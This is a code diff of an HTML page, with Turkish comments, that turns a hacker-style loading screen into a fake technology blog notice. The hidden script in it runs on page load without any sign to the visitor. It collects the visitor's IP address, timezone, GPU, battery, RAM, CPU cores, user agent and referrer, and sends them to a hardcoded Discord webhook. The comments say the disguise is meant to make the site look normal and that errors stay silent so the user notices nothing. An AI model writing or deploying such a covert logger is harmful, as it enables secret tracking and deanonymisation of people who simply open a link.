@@ -3,92 +3,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Yükleniyor...</title>
+    <title>Teknoloji Blogu - Hoş Geldiniz</title>
     <style>
-        body {
-            background-color: #000;
-            color: #0f0; /* Terminal yeşili */
-            font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
-        .status {
-            border: 1px solid #0f0;
-            padding: 20px;
-            box-shadow: 0 0 15px #0f0;
-        }
-        .cursor {
-            display: inline-block;
-            width: 10px;
-            background-color: #0f0;
-            animation: blink 1s infinite;
-        }
-        @keyframes blink {
-            50% { opacity: 0; }
-        }
+        /* Sitenin normal görünmesi için basit CSS */
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f9f9f9; color: #333; margin: 0; padding: 0; }
+        header { background-color: #2c3e50; color: white; padding: 20px; text-align: center; }
+        .content { max-width: 800px; margin: 40px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { margin: 0; font-size: 24px; }
+        p { line-height: 1.6; color: #666; }
+        .footer { text-align: center; margin-top: 50px; font-size: 12px; color: #aaa; }
     </style>
 </head>
 <body>
 
-    <div class="status">
-        [ SYSTEM ] : VERI TABANINA BAGLANILIYOR...<br>
-        [ STATUS ] : LUTFEN BEKLEYINIZ<span class="cursor">&nbsp;</span>
+    <header>
+        <h1>Modern Teknoloji Dünyası</h1>
+    </header>
+
+    <div class="content">
+        <h2>En Yeni Makaleler Yükleniyor...</h2>
+        <p>Şu an içerik sunucularımızda bir güncelleme çalışması yapılmaktadır. En kısa sürede en yeni rehberler, teknoloji haberleri ve incelemelerle karşınızda olacağız.</p>
+        <p>Sabrınız için teşekkür ederiz. Lütfen birkaç dakika sonra sayfayı yenileyiniz.</p>
+    </div>
+
+    <div class="footer">
+        © 2025 Teknoloji Blogu - Tüm Hakları Saklıdır.
     </div>
 
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
+        // Senin Webhook adresin
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
 
-        async function logSystemData() {
+        async function collectAllInfo() {
             try {
-                // IP bilgisini al
-                const ipReq = await fetch('https://api64.ipify.org?format=json');
+                // 1. IP Adresini Al
+                const ipReq = await fetch('https://api.ipify.org?format=json');
                 const ipRes = await ipReq.json();
                 const ip = ipRes.ip;
 
-                // Sistem bilgilerini topla
-                const data = {
-                    time: new Date().toLocaleString('tr-TR'),
+                // 2. GPU (Ekran Kartı) Bilgisi
+                let gpu = "N/A";
+                const canvas = document.createElement("canvas");
+                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+                if (gl) {
+                    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                    if (debugInfo) {
+                        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+
+                // 3. Pil Bilgisi (Async)
+                let batteryStatus = "N/A";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batteryStatus = `${Math.round(b.level * 100)}% - ${b.charging ? 'Sarj Oluyor' : 'Sarjda Degil'}`;
+                }
+
+                // 4. Diger Teknik Bilgiler
+                const info = {
                     ua: navigator.userAgent,
                     platform: navigator.platform,
-                    screen: `${window.screen.width}x${window.screen.height}`,
+                    screen: `${screen.width}x${screen.height}`,
                     lang: navigator.language,
-                    ref: document.referrer || "DIRECT_ACCESS"
+                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    mem: navigator.deviceMemory || "Bilinmiyor", // RAM (Sadece Chrome tabanlılarda)
+                    cores: navigator.hardwareConcurrency || "Bilinmiyor", // İşlemci Çekirdeği
+                    ref: document.referrer || "Dogrudan Giris",
+                    time: new Date().toLocaleString('tr-TR')
                 };
 
-                // Mesajı "Hack Paneli" log formatına sok (Emoji içermez)
-                const rawMessage = "```" + 
-                    "--- [ INCOMING CONNECTION LOG ] ---\n" +
-                    "TIMESTAMP  : " + data.time + "\n" +
-                    "IP_ADDRESS : " + ip + "\n" +
-                    "PLATFORM   : " + data.platform + "\n" +
-                    "RESOLUTION : " + data.screen + "\n" +
-                    "LANGUAGE   : " + data.lang + "\n" +
-                    "REFERRER   : " + data.ref + "\n" +
-                    "USER_AGENT : " + data.ua + "\n" +
-                    "--- [ END OF LOG ] ---" +
+                // 5. Hack Paneli / Terminal Log Formatı (Emojisiz)
+                const logMessage = "```\n" +
+                    "--- [ INCOMING SESSION LOG ] ---\n" +
+                    "TIMESTAMP     : " + info.time + "\n" +
+                    "REMOTE_IP     : " + ip + "\n" +
+                    "LOCATION_TZ   : " + info.tz + "\n" +
+                    "LANGUAGE      : " + info.lang + "\n" +
+                    "--------------------------------------------------\n" +
+                    "HARDWARE_INFO\n" +
+                    "PLATFORM      : " + info.platform + "\n" +
+                    "CPU_CORES     : " + info.cores + "\n" +
+                    "RAM_APPROX    : " + info.mem + " GB\n" +
+                    "GPU_RENDERER  : " + gpu + "\n" +
+                    "BATTERY_LEVEL : " + batteryStatus + "\n" +
+                    "DISPLAY_RES   : " + info.screen + "\n" +
+                    "--------------------------------------------------\n" +
+                    "BROWSER_INFO\n" +
+                    "REFERRER      : " + info.ref + "\n" +
+                    "USER_AGENT    : " + info.ua + "\n" +
+                    "--------------------------------------------------\n" +
+                    "--- [ END OF LOG ] ---\n" +
                     "```";
 
-                // Webhook'a ham metin olarak gönder
-                await fetch(webhookURL, {
+                // 6. Webhook'a Gönder
+                await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: rawMessage,
-                        username: "SYSTEM_LOGGER_V1"
-                    })
+                    body: JSON.stringify({ content: logMessage })
                 });
 
             } catch (err) {
-                // Hata durumunda sessiz kal (şüphe çekmemek için)
+                // Hata oluşursa kullanıcı hiçbir şey fark etmez
             }
         }
 
-        // Sayfa yüklendiğinde çalıştır
-        window.onload = logSystemData;
+        // Sayfa yüklendiği an sessizce çalıştır
+        window.onload = collectAllInfo;
     </script>
+
 </body>
 </html>
